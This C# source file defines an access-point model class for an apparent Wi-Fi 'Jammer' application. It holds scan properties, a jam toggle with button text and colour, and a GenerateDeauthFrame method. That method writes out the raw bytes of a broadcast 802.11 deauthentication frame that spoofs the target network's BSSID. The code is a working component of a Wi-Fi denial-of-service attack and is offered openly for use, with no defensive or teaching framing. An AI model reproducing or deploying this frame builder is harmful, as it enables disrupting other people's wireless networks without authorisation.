using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;

namespace JammerV1.Models
{
    public class AP : INotifyPropertyChanged, IJammableDevice
    {
        public string JamButtonColor => IsJammed ? "#f23f42" : "#2ec04f";
        public string JamButtonText => IsJammed ? "STOP JAMMING" : "JAM";
        private bool _isJammed;
        public bool IsJammed
        {
            get => _isJammed;
            set
            {
                if (_isJammed != value)
                {
                    _isJammed = value;
                    OnPropertyChanged(nameof(IsJammed));
                    OnPropertyChanged(nameof(JamButtonColor));
                    OnPropertyChanged(nameof(JamButtonText));
                }
            }
        }

        public byte[] GenerateDeauthFrame() {
            byte[] bssidBytes = Constants.Utils.ParseMacAddress(this.BSSID);
            byte[] deauthFrame = new byte[] {
                    0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, // Radiotap header - junk
                    0xc0, // Type / subtype - De-authentication
                    0x00, 0x3a, 0x01, // Duration Garbage
                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination address
                    bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // Source Address
                    bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // BSSID (Target AP MAC)
                    0x00, 0x48, // Sequence garbage
                    0x07, 0x00 // Reason - 0x07, 0x00 - Class 3 frame received from nonassociated STA
            };
            return deauthFrame;
        }
        public string BSSID { get; set; }
        public DateTime FirstTimeSeen { get; set; }
        public DateTime LastTimeSeen { get; set; }
        public int Channel { get; set; }
        public int Speed { get; set; }
        public string Privacy { get; set; }
        public string Cipher { get; set; }
        public string Authentication { get; set; }
        public int Power { get; set; }
        public int NumberOfBeacons { get; set; }
        public int NumberOfIV { get; set; }
        public string LANIP { get; set; }
        public int IDLength { get; set; }
        public string ESSID { get; set; }
        public string Key { get; set; }
        public List<Client> Clients { get; set; }

        // Event declared in INotifyPropertyChanged interface
        public event PropertyChangedEventHandler PropertyChanged;

        // Method to raise the PropertyChanged event
        protected virtual void OnPropertyChanged([CallerMemberName] string propertyName = null)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }
    }
}
